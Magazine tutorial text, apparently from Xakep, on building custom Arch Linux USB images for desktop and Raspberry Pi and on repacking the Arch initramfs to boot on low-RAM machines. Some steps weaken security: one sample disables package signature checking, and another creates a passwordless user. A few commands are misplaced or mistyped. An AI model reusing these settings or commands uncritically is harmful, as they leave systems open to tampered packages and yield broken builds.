umount /mnt/usb/boot
umount /mnt/usb

Деактивируем привязку устройства loop к файлу usb.img.


losetup -D


ПИШЕМ ОБРАЗ НА ФЛЕШКУ

Внимание! Если до этого момента ты еще не сломал свою систему, то сейчас
будет отличный шанс. Так что будь предельно осторожен.


        WWW

                            Детальное описание записи образа есть в офи‐
                         циальной вики.


Подключаем USB-носитель к системе и набираем команду


lsblk -piaf

Ищем USB-носитель в списке, запоминаем номер.
  И записываем на него образ. В указанной ниже команде поменяй зна‐
чение параметра of=/dev/sdX (вместо X подставь букву твоего диска).


dd if=usb.img of=/dev/sdX bs= 4096 status=progress && sync

Выходи из окружения root:


exit


ТЕСТИРУЕМ ОБРАЗ В QEMU (НЕОБЯЗАТЕЛЬНО)

Чтобы проверить, как работает наш образ, мы можем запустить его в эму‐
ляторе.
   Далее в этом разделе предполагается, что у тебя установлены эти пакеты:


qemu-base tigervnc openbsd-netcat

Запустить виртуальную машину из созданного образа ты можешь такой
командой:


qemu-system-x86_64 -drive file=usb.img,format= raw -m 1024 -enable-kvm
-monitor unix:/tmp/monitor.sock,server,nowait



  VNC server running on 127.0.0.1:5901


Подключиться к виртуальной машине можно, используя любой клиент VNC.
  В случае с TigerVNC команда подключения будет следующей:


vncviewer 127.0.0.1:5901



  TigerVNC Viewer v1.13.1
  Сборка от: 2024-01-20 02:29
  Copyright (C) 1999-2022, TigerVNC Team и многие другие (см. README.rst)
  Информация о TigerVNC на сайте https://www.tigervnc.org
  ...


Для  подключения  к  консоли  управления  виртуальной машины можешь
использовать, например, nc.


nc -U /tmp/monitor.sock



  QEMU 9.0.0 monitor - type 'help' for more information
  (qemu)





ВЫВОДЫ

У нас есть файл с установочным образом системы, который можно записать
на любые носители. Но самое главное — загрузившись с него, ты сможешь
ставить в систему дополнительные пакеты и делать любые настройки, нужные
для твоих задач.
  Я взял флешку на 4  Гбайт, и  после всех  действий на ней  оста‐
лось 1,2 Гбайт свободного места.


БОНУС

Этот метод создания образа диска универсален, его можно использовать
с разными конфигурациями Archiso. Например, с Сtlos, одной из отечествен‐
ных сборок Arch Linux.





Автор Сtlos использует собственный репозиторий для некоторых пакетов,
на странице проекта есть инструкция по его подключению.
  В качестве альтернативы можно отредактировать файл pacman.conf (из
каталога с настройками), указав в нем дополнительный репозиторий и отклю‐
чив проверку подписи пакетов.
   Вот в качестве примера фрагмент измененного файла pacman.conf:


 ...
 [ctlos_repo]
 SigLevel = Optional TrustAll
 Server = https://github.com/ctlos/$repo/raw/master/$arch
 Server = https://osdn.net/projects/ctlos/storage/$repo/$arch
 Server = https://cvc.keybase.pub/$repo
 #Include = /etc/pacman.d/ctlos-mirrorlist


 [ctlos-aur]
 SigLevel = Optional TrustAll
 Server = https://github.com/ctlos/$repo/raw/master/$arch
 Server = https://osdn.net/projects/ctlos/storage/$repo/$arch
 Server = https://cvc.keybase.pub/$repo
 #Include = /etc/pacman.d/ctlos-mirrorlist


Важный момент: клонировать удаленный репозиторий лучше из‑под root, пос‐
кольку все файлы в каталоге с настройками должны принадлежать руту.



        WWW

                       •Arch Linux USB
                        •Создание  образа  GPT-диска  с  несколькими
                          разделами без loop-устройств (Linux.org.ru)
                         •ArchWiki на русском
COVERSTORY





Случается, что систему нужно переустанав‐
ливать или разворачивать на другом компь‐
ютере. Для  этого  бывает  удобно иметь
заранее подготовленную флешку, где будет
дистрибутив со всеми нужными настрой‐              ksandr                                                                                            ksandr@tutamail.com
ками. В этой статье я покажу, как сделать
такой образ на основе Arch Linux — с авто‐
загрузкой графической среды и базовым
набором программ. Мы сделаем две вер‐
сии: для десктопа на x86-64 и для Raspberry
Pi.


ДЕСКТОП

Начнем с десктопной версии. Для нее нам понадобится добавить в Arch гра‐
фическое окружение и автостарт.
   Если же тебе нужен серверный вариант, то это руководство можешь рас‐
сматривать как пример, а весь нужный софт выберешь сам. Это просто:
находишь описание нужного сервиса на официальной вики и применяешь
инструкцию к каталогу airootfs как корню твоей будущей системы. Впрочем,
всё по порядку.
   Собрать список пакетов, который бы устроил всех, нереально. Поэтому
приведу пример  установки и  настройки на основе  того, что я выбрал
для себя, а ты уже сам решишь, что убрать и добавить.
   Вот что будет на нашей флешке:
 • базовые пакеты Archiso для сборки официального образа;
 • графическая система X.org;
 • рабочая среда Xfce 4;
 • браузер;
 • несколько текстовых редакторов;
 • дополнительные пакеты, нужные в повседневной работе.


Подготовка
В статье «Карманный Arch. Делаем флешку с живым образом Arch Linux» я уже
рассказывал о том, как сделать загрузочный внешний диск с Arch Linux.
В этой же статье я покажу, как сделать свой конфиг для утилиты Archiso. Даль‐
ше ты можешь воспользоваться инструкцией из первой статьи, чтобы создать
образ для такой же флешки.
   Дальше мы будем создавать и наполнять каталог airootfs и составлять
список пакетов в файле packages.x86_64.
   Если при установке пакета в систему будут необходимы специальные нас‐
тройки, мы внесем их в airootfs.


Минимальный образ
Образ я окрестил xrerus, где X — в честь графической среды (или журнала
«Хакер», как тебе больше нравится), re — от release engineering, ну а почему
rus, ты, думаю, догадаешься.
  Все действия мы будем производить с привилегиями суперпользователя,
так что сразу пиши su и вводи пароль.
   Поскольку за основу я взял официальный образ Arch Linux, мы начнем
с того, что скопируем его и переименуем в xrerus.


cp -rv /usr/share/archiso/configs/releng xrerus

Либо можно сразу скачать образ из официального репозитория, если ты
еще этого не сделал:


git clone https://gitlab.archlinux.org/archlinux/archiso.git

Кстати, при выборе пакетов ограничимся только официальным репозитори‐
ем. Причины две: более надежная поддержка пакетов и установка без допол‐
нительных действий. Добавление пакетов из других репозиториев, возможно,
рассмотрим в другой раз.
  Для удобства записываем путь до каталога с конфигами в переменную:


export ARCHISO=/home/ЛОГИН/xrerus


Графическая система
В минимальном образе главная задача — универсальность. Нам нужно, что‐
бы он работал на большинстве компьютеров. Поэтому добавляем xorg-server,
менеджер входа, открытые драйверы и сервер VNC.
   Начнем с настройки менеджера входа LightDM.
   Создаем каталог для файлов настроек:


mkdir -p $ARCHISO/airootfs/etc/lightdm

Файл настроек greeter-gtk:


vim $ARCHISO/airootfs/etc/lightdm/lightdm-gtk-greeter.conf


[greeter]
background = /usr/share/backgrounds/wallpaper

Не забываем скопировать файл для фона.


mkdir -p $ARCHISO/airootfs/usr/share/backgrounds
cp -v ~wallpaper $ARCHISO/airootfs/usr/share/backgrounds/wallpaper


             INFO

                Мы не ставим никаких пакетов с обоями, так что
                       для начала будет черный фон, а красоту можешь
                       добавить сам.


Включаем автозапуск сервиса LightDM:


ln -sv /usr/lib/systemd/system/lightdm.service $ARCHISO/airootfs/etc/
systemd/system/display-manager.service

В конец файла packages.x86_64 дописываем устанавливаемые пакеты:


$ARCHISO/packages.x86_64
...
xorg-server
xorg-xinit
xorg-xrandr
lightdm
lightdm-gtk-greeter
xf86-video-dummy
xf86-video-fbdev
xf86-video-vesa
xf86-video-amdgpu
xf86-video-ati
xf86-video-intel
xf86-video-nouveau
autorandr
tigervnc


Рабочая среда Xfce 4
Тут у нас есть два варианта: можно установить группу пакетов xfce4, а можно
выбрать вручную только самые нужные пакеты. Мы пойдем по второму пути.
   Добавляем пакеты в список packages.x86_64:


xfwm4
xfce4-battery-plugin
xfce4-notifyd
xfce4-panel
xfce4-power-manager
xfce4-pulseaudio-plugin
xfce4-session
xfce4-settings
xfce4-terminal
xfce4-xkb-plugin
xfce4-clipman-plugin
accountsservice
xdg-utils
polkit


Софт
Дальше я просто перечислю все пакеты с софтом, которые я выбрал для сво‐
его образа.
   Браузеры:


$ARCHISO/packages.x86_64
...
luakit
firefox
firefox-i18n-ru
chromium

Редакторы:


$ARCHISO/packages.x86_64
...
vim
nano
mousepad
leafpad

Средства коммуникации:


$ARCHISO/packages.x86_64
...
discord
telegram-desktop


Дополнительные пакеты
Нам понадобятся шрифты:


$ARCHISO/packages.x86_64
...
ttf-droid
ttf-croscore
ttf-liberation
ttf-dejavu
ttf-inconsolata

Звуковые драйверы и утилиты:


$ARCHISO/packages.x86_64
...
alsa-firmware
alsa-plugins
alsa-utils
pipewire-pulse
pipewire-alsa
pipewire-jack
rtkit
pavucontrol

Если на твоей машине есть Bluetooth, то утилиты для работы с ним:


$ARCHISO/packages.x86_64
...
bluez
bluez-utils
bluez-obex
blueman


Сетевые утилиты
Тут нам надо определиться, каким из доступных средств мы будем настра‐
ивать сеть. Так как у нас десктопный вариант, мой выбор — NetworkManager.
   Автозагрузка NetworkManager при старте:


ln -sv /usr/lib/systemd/system/NetworkManager.service $ARCHISO/
airootfs/etc/systemd/system/multi-user.target.wants/NetworkManager.
service
ln -sv /usr/lib/systemd/system/NetworkManager-dispatcher.service
$ARCHISO/airootfs/etc/systemd/system/dbus-org.freedesktop.nm-
dispatcher.service
ln -sv /usr/lib/systemd/system/NetworkManager-wait-online.service
$ARCHISO/airootfs/etc/systemd/system/network-online.target.wants/
NetworkManager-wait-online.service

Также не забудем запустить сервис сопоставления доменных имен:


ln -sv /usr/lib/systemd/system/systemd-resolved.service $ARCHISO/
airootfs/etc/systemd/system/systemd-resolved.service

Устанавливаем имя хоста:


echo archi > $ARCHISO/airootfs/etc/hostname

Пишем /etc/hosts:


vim $ARCHISO/airootfs/etc/hosts


127.0.0.1        localhost
::1              localhost
127.0.1.1        archi

Если хост использует статический IP-адрес, то его следует указать вмес‐
то 127.0.1.1. Если у системы есть fully qualified domain name (FQDN), вставь
его перед именем хоста. Подробнее про настройку сети — в официальной
вики.
   Добавляем пакеты в список для установки.


$ARCHISO/packages.x86_64
...
network-manager-applet
networkmanager
networkmanager-openconnect
networkmanager-openvpn
networkmanager-pptp
networkmanager-vpnc
networkmanager-l2tp
dnsutils
modemmanager
mobile-broadband-provider-info

И не забудем про пользовательские утилиты:


$ARCHISO/packages.x86_64
...
openssh
git
wget
curl


Работа с файлами
Стандартный файловый менеджер в Xfce 4 — это Thunar. Добавляем его.


$ARCHISO/packages.x86_64
...
thunar
thunar-archive-plugin
thunar-media-tags-plugin
thunar-volman

Для более комфортной работы с файловыми системами ставим дополнитель‐
ные пакеты:


$ARCHISO/packages.x86_64
...
gvfs
gvfs-nfs
gvfs-smb
nfs-utils
ntfs-3g
sshfs


Дополнительный софт
Дальше в списке нет обязательных и незаменимых программ, так что можешь
убирать или заменять что угодно на свое усмотрение.
  Я себе добавил:
 • GParted — графический редактор разделов и дисков (утилита особенно
   пригодится, если ты собираешься использовать образ как установочный
   диск);
 • feh — смотрелка картинок;
 • Flameshot — если понадобится делать скриншоты;
 • mpv — аудио- и видеоплеер;
 • htop — монитор системных ресурсов;
 • mc — двухпанельный файловый менеджер.

Также я добавил несколько самых важных сетевых утилит и комплект архи‐
ваторов:


$ARCHISO/packages.x86_64
...
gzip
p7zip
unrar
unzip
file-roller

С установкой пакетов на этом всё, но есть еще несколько настроек, которые
нам надо сделать.


Настройка
На определенном этапе загрузки управление переходит к образу initramfs-
linux.img. Для установочного ISO этот образ особый. Так как наш инсталл
Arch Linux не будет отличаться от обычной установки на жесткий диск, мы
можем  использовать  стандартные  настройки для  создания initramfs-
linux.img.
   Если менять настройки mkinitcpio, то конфиг перестанет быть пригодным
для сборки обычных ISO-образов. Это легко исправить, либо вернув потом
настройки mkinitcpio, либо сделав в этом файле две секции: одну — для сбор‐
ки ISO, другую — для наших IMG. Но на практике мы пойдем по наиболее лег‐
кому  пути — выберем  создание initramfs-linux.img с  настройками
по умолчанию.
   Так как предполагается, что мы делаем образ из системы Arch Linux x86-
64, мы можем подсмотреть пример файла mkinitcpio.conf на нашей системе.
Далее предполагается, что мы используем стандартное ядро — то, что
содержится в пакете linux.
   Копируем файлы настроек mkinitcpio:


cp -v /etc/mkinitcpio.d/linux.preset $ARCHISO/airootfs/etc/
mkinitcpio.d/linux.preset
cp -v /etc/mkinitcpio.conf $ARCHISO/airootfs/etc/mkinitcpio.conf

Удаляем из него лишнее:


$ARCHISO/airootfs/etc/mkinitcpio.d/linux.preset
ALL_kver="/boot/vmlinuz-linux"


PRESETS=('default')


default_config="/etc/mkinitcpio.conf"
default_image="/boot/initramfs-linux.img"

Редактируем файл /etc/mkinitcpio.conf. В параметре HOOKS необходимо
убрать autodetect.


$ARCHISO/airootfs/etc/mkinitcpio.conf
...
HOOKS=(base udev microcode modconf kms keyboard keymap consolefont
block filesystems fsck)
...




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
    КАСТОМНЫЙ ARCH
         СОЗДАЕМ ОБРАЗЫ ARCH LINUX
         ДЛЯ ДЕСКТОПА И RASPBERRY PI




Команды для включения русской локализации возьмем из официальной вики.
   Ставим общесистемное значение переменной LANG:


echo LANG=ru_RU.UTF-8 > $ARCHISO/airootfs/etc/locale.conf

Файл /etc/locale.gen содержит списки доступных локализаций системы,
рекомендую оставить эти две:


$ARCHISO/airootfs/etc/locale.gen
en_US.UTF-8 UTF-8
ru_RU.UTF-8 UTF-8

Ставим шрифт и параметры изменения раскладки.


$ARCHISO/airootfs/etc/vconsole.conf
KEYMAP=ru
FONT=cyr-sun16

Установи свою временную зону.


ln -sfv /usr/share/zoneinfo/Europe/Moscow $ARCHISO/airootfs/etc/
localtime

При необходимости еще можно добавить обычного пользователя. Например,
archi.
   Дописываем в конец файла passwd:
   echo    archi:x:1000:1000:archi:/home/archi:/usr/bin/bash    >>

$ARCHISO/airootfs/etc/passwd
  И добавляем запись в shadow:


echo archi::14871:::::: >> $ARCHISO/airootfs/etc/shadow


           WARNING

                Мы задали пустой пароль пользователю, то есть
                            зайти в систему он сможет без указания пароля.



mkdir -p $ARCHISO/airootfs/home/archi
chown 1000:users $ARCHISO/airootfs/home/archi

Почему 1000, а не имя archi? Если на твоем локальном компьютере есть
пользователь с таким же именем, но с другим ID, то при установке прав будет
использован его номер с текущей машины и потом при загрузке свежеус‐
тановленной системы у пользователя не будет доступа к домашнему катало
гу.
   Настройки пользовательского окружения можно задать, используя каталог
skel ($ARCHISO/airootfs/etc/skel).
  В готовой собранной системе при использовании команды useradd фай‐
лы из каталога skel копируются в каталог пользователя со сменой владель‐
ца.
   Удаляем ненужные «хуки» pacman.


rm -v $ARCHISO/airootfs/etc/pacman.d/hooks/*


           WARNING

                    При  создании  ISO-образа  диска при помощи
                        mkarchiso   часть   настроек   будет   сделана
                      при помощи «хуков» (сценариев командной стро‐
                           ки) менеджера пакетов pacman. Эти хуки уда‐
                          ляются при создании ISO-образа. Если ты пла‐
                         нируешь   использовать   эту   конфигурацию
                       для создания ISO-образов с помощью mkarchiso,
                      не удаляй хуки.


Теперь в наш конфиг входят все пакеты из официального установочного
образа. Также мы добавили графический интерфейс и сетевой менеджер,
настроили его  автозагрузку и добавили минимальный набор программ.
Теперь у нас есть конфиг для сборки образа диска для установки Arch Linux
в графическом окружении. О том, как собирать сам образ, я писал в статье
«Карманный Arch», можешь обратиться к ней.
  На этом цветочки закончились, переходим к ягодкам.


RASPBERRY PI

Можно ли тем же методом сделать образ для ARM-систем, например
для Raspberry Pi? Сейчас попробуем и узнаем!
   У Archiso есть две стандартные конфигурации: releng, которая использует‐
ся для создания официальных образов ISO, и baseline — минимальная кон‐
фигурация для создания собственных сборок.
   Сначала я хотел делать образ на основе baseline, но оказалось, что
переделать там надо больше половины, так что я решил собирать образ
с нуля. К тому же совместимость с Archiso для Raspberry Pi нам не нужна.


Подготовка
Я буду собирать конфиг для Raspberry Pi 4B+ — просто потому, что она
у меня есть. Не думаю, что для других версий «Малины» будут какие‑то серь‐
езные отличия.
  За основу возьмем образ Arch Linux ARM.
   Напомню, что все действия мы будем делать от рута, поскольку владель‐
цем всех файлов в каталоге с настройками должен быть root.


su
cd ~

Создаем наш рабочий каталог.


mkdir -v pi

Для удобства записываем путь до каталога с настройками в переменную.


export ARCHISO=/root/pi

Стандартные конфиги Archiso сделаны для архитектуры x86-64. Мы же будем
собирать для AArch64. У нас будут другие репозитории, поэтому нам надо
отредактировать файл pacman.conf нашего конфига.
  Я пишу статью, работая уже на Arch Linux ARM, поэтому могу просто ско‐
пировать их конфиг:


cp /etc/pacman.conf $ARCHISO/pacman.conf

Но для полноты картины приведу фрагмент файла, который  отличается
от версии для x86-64:


$ARCHISO/pacman.conf
...
Architecture = aarch64
...
[core]
Include = /etc/pacman.d/mirrorlist


[extra]
Include = /etc/pacman.d/mirrorlist


[alarm]
Include = /etc/pacman.d/mirrorlist


[aur]
Include = /etc/pacman.d/mirrorlist

И подправим файл со списком репозиториев:


/etc/pacman.d/mirrorlist
Server = http://mirror.yandex.ru/archlinux-arm/$arch/$repo
Server = http://mirror.archlinuxarm.org/$arch/$repo

Как и раньше, список пакетов мы будем хранить в файле packages. Создадим
файл и заодно запишем в него первый базовый пакет:


echo base > $ARCHISO/packages.aarch64


Пакеты ARM
В нашем будущем образе не хватает самых важных пакетов: ядра, загрузчика
и ключей для pacman. Добавим их в конец нашего файла packages.aarch64:


$ARCHISO/packages.aarch64
raspberrypi-bootloader


linux-rpi
linux-rpi-headers


archlinuxarm-keyring

Пара  слов о  ядрах и  загрузчиках. Для  Raspberry  Pi два  загрузчика:
raspberrypi-bootloader и uboot-raspberrypi. С ядрами тоже есть вари‐
анты, но не каждый  загрузчик подходит  к каждому ядру. В принципе,
при попытке поставить несовместимые пакеты выводится соответствующее
сообщение, но на всякий случай я тебя предупредил.
   Так как мы жестко привязываемся к железу, можем заранее записать файл
/etc/fstab. Точнее, даже обязательно сделать это!


echo "/dev/mmcblk0p1  /boot   vfat    defaults,
errors=remount-ro       0       0" > $ARCHISO/airootfs/etc/fstab


Настройка загрузчика
Загрузчик настраивается через файл /boot/config.txt:


vim $ARCHISO/airootfs/boot/config.txt

Там доступно множество настроек, которые можно менять, а можно и не
менять. Дальше я выставлю их для своей RPi 4B+, а если у тебя другая вер‐
сия, обязательно сверься с документацией.
   Строку загрузки оставляем как есть:


initramfs initramfs-linux.img followkernel

Для  отключения  черной  рамки по  периметру  экрана добавляем такой
параметр:


pacman-key --init
pacman-key --populate archlinuxarm

Для отключения цветной заставки перед загрузкой:


disable_splash=1

Если ты подключаешь монитор по HDMI и в нем нет встроенных колонок, то
звук можно выводить через мини‑джек. Для этого надо указать загрузку виде‐
одрайвера без вывода звука:


dtoverlay=vc4-kms-v3d-pi4,noaudio=on

Этот параметр  должен быть  указан выше  строки  загрузки  (initramfs
initramfs-linux.img followkernel).
  Еще можно отключить индикаторы на плате:


dtparam=pwr_led_trigger=default-on
dtparam=pwr_led_activelow=off


dtparam=act_led_trigger=none
dtparam=act_led_activelow=off

И индикаторы разъема RJ45:


dtparam=eth_led0=4
dtparam=eth_led1=4

Название параметров для индикаторов недавно менялось, так что на всякий
случай сверься с доками.
  На этом все. Установить пакеты и настроить пользовательское окружение
можешь по аналогии с нашим образом xrerus. Достаточно повторить все дей‐
ствия за исключением раздела настройки mkinitcpio.
   Единственная  оговорка: для «Малины» не нужны будут пакеты xf86-
video-ati и xf86-video-intel, так что просто не добавляй их в свой
packages.aarch64.


Сборка образа для Raspberry Pi
Сборка образа тоже происходит уже описанным выше способом, но есть
важное отличие: нам понадобится сделать два раздела на диске. Первый
раздел будет называться boot, и его нужно отформатировать в FAT32. Второй
раздел — корневой.
   Разбиваем диск:


sgdisk -o -n 1:0:+256M -t 1:EF00 -n 2:0:0 -t 2:8300 usb.img

При установке пакетов не забудь использовать файл со списком пакетов —
packages.aarch64.


grep -v '^#' $ARCHISO/packages.aarch64 | tr '\n' ' ' | xargs
pacstrap -c -G -M -C $ARCHISO/pacman.conf -- /mnt/usb

Еще тебе надо будет инициализировать ключи pacman. Это можно сделать
во время создания образа, когда зайдешь в chroot, либо уже в готовой сис‐
теме перед первым запуском pacman.
   Инициализируем ключи для pacman:


pacman-key --init
pacman-key --populate archlinuxarm


Альтернативный вариант
Если ты планируешь использовать карту памяти на 32 Гбайт или больше, то
создавать образ с большим пустым местом не всегда удобно. В официаль‐
ном дистрибутиве Arch Linux ARM сделано именно так. Вся установка про‐
исходит в каталог, а затем его просто пакуют в архив. При  установке
на накопитель диск  разбивается на нужные разделы и форматируется,
а затем туда  распаковывается архив. Переписывать это руководство я
не буду, оно доступно на сайте проекта Arch Linux ARM.


GPIO
У Raspberry Pi есть интерфейс для подключения всякого оборудования, в том
числе самодельного, он называется GPIO. Для работы с ним из Python нам
понадобится пакет из репозитория AUR — python-rpi-gpio.
   Скачиваем python-rpi-gpio, собираем и устанавливаем его:


 git clone https://aur.archlinux.org/python-rpi-gpio.git
 cd python-rpi-gpio
 makepkg -si





ВЫВОДЫ

Собрав образ xrerus, мы получили систему, аналогичную официальному уста‐
новочному диску, но с графическим интерфейсом и дополнительными прог‐
раммами. То же самое мы проделали и с прицелом на Raspberry Pi, так что
теперь у тебя будет шаблон, по которому ты сможешь делать свои дистри‐
бутивы Arch Linux.
COVERSTORY





В этой статье мы исправим дистрибутив
Arch Linux 2024.06 так, чтобы его можно
было   использовать   на   компьютерах
с малым объемом оперативной памяти. А в
ходе работы познакомимся с элементами         Игорь Орещенков                                                                                                   r0bur@mail.ru
структуры    файловой    системы   ISO
9660 и  научимся  использовать  штатные
инструменты для решения околохакерских
задач.


В предыдущих статьях «диетологии» — «Linux на диете» и «Новая диета
для Linux» — мы поработали над снижением требований к оперативной
памяти Bodhi Linux и достигли в этом определенных успехов. Но круг пок‐
лонников Bodhi не так велик. Поэтому давай посмотрим, каков аппетит
у гораздо более близкого сердцу хакера Arch Linux.
   Как ты знаешь, Arch Linux загружается в текстовую консоль, после чего
дает пользователю полнейшую свободу действий. Наверное, 512 Мбайт ОЗУ
для такой среды будет более чем достаточно? Давай проверим.
   Итак, выставляем в свойствах виртуальной машины объем оперативной
памяти 512 Мбайт, загружаем образ archlinux-2024.06.01-x86_64.iso, подклю‐
чаем, запускаем, получаем...




  Loading /arch/boot/x86_64/vmlinuz-linux... ok


  Loading /arch/boot/x86_64/initramfs-linux.img...ok



  [ ] Initramfs unpacking failed: write error


  mount: error while loading shared libraries: libmount.so.1: cannot open
  shared object file: No such file or directory


  ...


  ERROR: Failed to mount '' on real root


  You are now being dropped into an emergency shell.


  sh: can't access tty; job control turned off



  [rootfs ~]# _



«Ага‑а-а!» — сказали бы тут угрюмые русские мужики, валившие в далеком
сибирском лесу вековые кедры двуручными пилами. И здесь нас встретила
старая добрая ошибка: Initramfs unpacking failed: write error. Прав‐
да, вместо kernel panic мы получили аварийную командную строку, но она
не работает. Как понятно из последнего сообщения, оболочка sh не смогла
связаться с терминалом tty.
   Похоже, нам есть чем заняться! Приступим. В качестве рабочей операци‐
онной системы я по привычке воспользовался Bodhi Linux 6.0, что в итоге
привело к... Но обо всем по порядку.


ИЗМЕРЯЕМ И РАЗБИРАЕМ

Для начала еще раз попытаемся запустить Arch Linux, указав в параметрах
ядра опцию debug console=ttyS0, чтобы отладочные события шли в пос‐
ледовательный порт, который у виртуальной машины можно привязать к фай‐
лу. Больше всего нас сейчас интересует распределение оперативной памяти.





  [ ] Memory: 320340K/523832K available (18432K kernel code, 2164K rwdata,
  13224K rodata, 3412K init, 3624K bss, 203232K reserved, 0K cma-reserved)


  ...



  [ ] Initramfs unpacking failed: write error



  [ ] Freeing initrd memory: 143796K



Из сообщения видно, что после загрузки ядра с упакованным образом
минимальной  файловой  системы (МФС) и  резервирования  служебных
областей для работы осталось 320 340 Кбайт оперативной памяти. Не то что‐
бы совсем уж мало, но с  учетом  упакованного размера образа МФС
в 143 796 Кбайт исчерпание памяти не выглядит чем‑то удивительным.
  Для дальнейшей работы с содержимым дистрибутивного образа удобно
извлечь его в отдельный каталог isofs. Если он примонтирован в точке /
media/ARCH_202406, это можно сделать командой


cp -R /media/ARCH_202406/. ./isofs





                  Творческий порядок в рабочем каталоге

Теперь  посмотрим,  что собой  представляет  упакованный образ МФС,
который находится в файле isofs/arch/boot/x86_64/initramfs-linux.
img.



  $ initrd=isofs/arch/boot/x86_64/initramfs-linux.img
  $ dd if=$initrd bs=512 | file -z -
  /dev/stdin: ASCII cpio archive (SVR4 with no CRC)


Понятно,  сначала  идет  неупакованный  архив  CPIO.  Распакуем‑ка  его
в каталог initrd_1 и посмотрим, что в нем.



  $ mkdir initramfs_1
  $ dd if=$initrd bs=512 | cpio -iD initramfs_1
  260261 blocks


Оказывается, он содержит микрокод процессоров AMD и Intel в каталоге
kernel, а также модули ядра и двоичные файлы устройств в каталогах usr/
lib/modules и usr/lib/firmware соответственно. Причем, судя по суф‐
фиксам .zst, большинство файлов уже сжаты алгоритмом ZSTD, что сущес‐
твенно снижает наши возможности оптимизации. Давай посмотрим, какой
объем занимают файлы этого блока МФС.



  $ du -sh initramfs_1/{kernel,usr/lib/*}
  13M initramfs_1/kernel
  69M initramfs_1/usr/lib/firmware
  53M initramfs_1/usr/lib/modules


Хорошо, теперь глянем, что еще есть в образе МФС.



  $ dd if=$initrd bs=512 skip=260261 | file -z -
  /dev/stdin: data


А это что за новость?! Какая еще data? Надо разобраться:



  $ dd if=$initrd bs=512 skip=260261 count=1 | hexdump -C
  1+0 records in
  1+0 records out
  512 bytes copied
  00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00
  |................|
  *
  00000200


Нули?! Видимо, сборщики образа МФС решили выровнять начала блоков.
Это, конечно, хорошо, но где же начинается следующий блок?



  $ cmp $initrd /dev/zero $((512*260261))
  isofs/arch/boot/x86_64/initramfs-linux.img /dev/zero differ: byte 9729,
  line 1


Понятно, теперь мы можем снова попытаться определить тип следующего
блока:



  $ dd iflag=skip_bytes if=$initrd bs=512 skip=$((512*260261+9728)) | file
  -z -
  /dev/stdin: ASCII cpio archive (SVR4 with no CRC) (XZ compressed data)


Ага, второй блок представляет собой архив CPIO, сжатый алгоритмом XZ.
Распакуем и посмотрим, что в нем:



  $ mkdir initramfs_2
  $ dd iflag=skip_bytes if=$initrd bs=512 skip=$((512*260261+9728)) | unxz
  | cpio -iD initramfs_2
  27309+1 records in
  27309+1 records out
  13982236 bytes (14 MB, 13 MiB) copied
  86167 blocks


А в нем, как нетрудно догадаться, оставшаяся часть МФС: утилиты и биб‐
лиотечные модули, файлы с настройками и сценарий init, запускаемый
ядром  после  инициализации.  Занимает  все  это  в  распакованном
виде 43 Мбайт.



  $ du -sh initramfs_2
  43M initramfs_2



И ЧТО ТЕПЕРЬ С ЭТИМ ДЕЛАТЬ?

Итак, образ МФС мы распаковали. Теперь надо решить, что с ним делать
дальше. Фокус с применением алгоритмов сжатия тут не пройдет, потому что
всё уже сжали до нас. Можно было бы удалить некоторые ненужные драй‐
веры, но не хотелось бы нарушать задумку создателей дистрибутива. Раз они
поместили драйверы  видеоадаптеров в МФС,  значит, они  тут  нужны...
Или нет?
   Погоди‑ка, а что там у нас было во время самой первой попытки загрузить
Arch Linux на 512 Мбайт? Неработающая консоль? А откуда взялась консоль,
если при распаковке МФС произошла ошибка? Получается, что ошибку рас‐
паковки МФС ядро не считает критической, столкнувшись с такой ситуацией,
оно не паникует, а пытается работать дальше как ни в чем не бывало. Вот
как выглядит журнал загрузки с включенными отладочными сообщениями:




  ...



  [ ] Initramfs unpacking failed: write error


  ...



  [ ] Run /init as init process


  ...


  mount: error while loading shared libraries: libmount.so.1: cannot open
  shared object file: No such file or directory


  ...


  /init: line 16: can't open /proc/cmdline: no such file


  :: mounting '' on real root


  mount: error while loading shared libraries: libmount.so.1: cannot open
  shared object file: No such file or directory


  ERROR: Failed to mount '' on real root


  You are now being dropped into an emergency shell.


  sh: can't access tty; job control turned off



  [rootfs ~]# _



Получается, из‑за того, что файл библиотеки libmount.so.1 не попал в ту
часть МФС, которая успела распаковаться, сценарий init не смог примон‐
тировать виртуальные файловые системы, включая /proc, потом не смог
обработать параметры ядра /proc/cmdline, и пошло‑поехало. Как в стихот‐
ворении Маршака: «Враг вступает в город, пленных не щадя, оттого, что в куз‐
нице не было гвоздя».
   Если бы все необходимое для работы сценария init и переключения
на полноценную корневую файловую систему распаковалось, а драйверы
видеоадаптера — нет, то мы этой последней неприятности, возможно, даже
и не заметили бы?
   Что ж, эта гипотеза подсказывает одно направление для изысканий. Надо
переставить блоки в файле образа МФС так, чтобы порция с программами
и библиотеками шла в нем первой и гарантированно распаковывалась в пол‐
ном объеме. Потом пусть будут драйверы накопителей и файловых систем,
а в самом конце разместим двоичные файлы устройств.
  На компьютерах с достаточным объемом оперативной памяти все рас‐
пакуется и никак не повлияет на дальнейшую работу, а на системах с огра‐
ниченной памятью не получится воспользоваться некоторыми адаптерами
Wi-Fi, но зато будет работающая консоль. По‑моему, этот вариант стоит того,
чтобы попробовать его реализовать!


СТРОИТЬ — НЕ ЛОМАТЬ...

Чтобы не заниматься кропотливым отбором, сформируем блоки образа МФС
в следующем порядке.
 1. Микрокод процессоров Intel и AMD initramfs_1/kernel — несжатый
   CPIO-архив.
 2. Утилиты, библиотеки, конфиги initramfs_2 — сжатый XZ CPIO-архив.
 3. Модули ядра Linux initramfs_1/usr/lib/modules — несжатый CPIO-
   архив.
 4. Двоичные файлы устройств initramfs_1/usr/lib/firmware — нес‐
   жатый CPIO-архив.

Реализуем этот замысел.



  $ newinitrd='initramfs-linux.img'
  $ cd initramfs_1
  $ { echo './early_cpio' ; find './kernel' ; } | cpio -oH newc >
  ../$newinitrd
  25427 blocks
  $ cd ../iniramfs_2
  $ find '.' | cpio -oH newc | xz -C none  >> ../$newinitrd
  86167 blocks
  $ cd ../initramfs_1
  $ find './usr/lib/modules' | cpio -oH newc >> ../$newinitrd
  98722 blocks
  $ find './usr/lib/firmware' | cpio -oH newc >> ../$newinitrd
  136111 blocks


Поместим сформированный образ МФС в файловую систему дистрибутива:


chmod u+w isofs/arch/boot/{x86_64,x86_64/initramfs-linux.img}
mv initramfs-linux.img isofs/arch/boot/x86_64/

Теперь можно собрать ISO:



  $ chmod u+w isofs/boot/syslinux/isolinux.bin
